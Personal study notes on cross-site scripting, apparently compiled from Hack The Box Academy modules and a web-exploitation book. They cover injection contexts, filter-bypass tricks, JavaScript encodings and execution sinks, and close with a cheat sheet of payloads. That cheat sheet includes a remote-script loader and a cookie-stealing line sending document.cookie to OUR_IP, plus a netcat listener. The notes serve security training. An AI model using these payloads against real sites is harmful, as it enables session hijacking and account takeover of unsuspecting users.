# XSS and CSRF
- [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
- [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)

# Notes
## Attacking and Exploiting Modern Web Applications (Kindle)
### Where is the output presenting itself?
Determine where your input is getting printed in the HTTP response we receive back:
- Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
- If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
- Same applies to `<textarea>` - we have to escape it first with `</textarea><script>alert(1)</script>`
- If we are inside a HTMl attribute we can try terminate it right before our payload (vector). An attribute can be delimited by single or double quotes or whitespace. Then we close the tag and place our payload e.g `'><script>alert(1)</script>` or `"><script>alert(1)</script>`
- If we can't escape out of an attribute we might be able to abuse it itself: e.g if we are in a `href` or `src` attribute we can use it directly with: `javascript:alert(1)` but each attribute/element might behave a little differently. And `"onmouseover="alert(1)` or  `'onmouseover='alert(1)` are valid for most.
- If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
- Markdown XSS is a thing: `[xss[(javascript:alert('1'))`

### When is our input getting proces?
`<script>alert(1)</script>` is triggered on page load. However if our payload loads dynamically, such as `<img src=x onerror-alert(1)>`, this may be advantageous since onerror is triggered dynamically. Which means:
- Harder for security scanners to detect since the malicious code isn't present during initial page analysis :point_left:
- Can bypass some client-side filters that only check content on page load :point_left:
- Often involves content that gets injected into the DOM after the page has already loaded



## XSS Filter Bypasses
Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.

### How might these filters be implemented?
- Allow listing (Whitelisting) of allowed elements, attributes or characters.
- Blacklisting of allowed elements, attributes or characters.

### Weak Blacklists
- Casing: `<ScRiPt>alert(1);</ScRiPt>`
- Casing: `<object data="JaVaScRiPt:alert(1)">`
- Casing: `<img src=x OnErRoR=alert(1)>`
- No Space: `<svg/onload=alert(1)>`
- If `img` is blocked, try `audio` or `video`
- If `alert` is blocked, try `prompt` or `confirm`
- If parenthesis `()` are blocked, try the back tick `
- To combine the last 3:
```
<audio src onloadstart=confirm`1`>
```

### JavaScript Encodings
- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

### String Creation
- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- source: `/alert(1)/.source`
- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`

### Execution Sinks:
- eval: `eval("alert(1)")`
- setTimeout: `setTimeout("alert(1)")`
- setInterval: `setInterval("alert(1)")`
- Function: `Function("alert(1)")()`
- constructor: `[].constructor.constructor(alert(1))()`

---



---

# HTB Cheat Sheet
## XSS Payloads
| Code | Description |
|------|-------------|
| `<marquee>` | Basic XSS Payload |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

## Commands

| Code | Description |
|------|-------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |


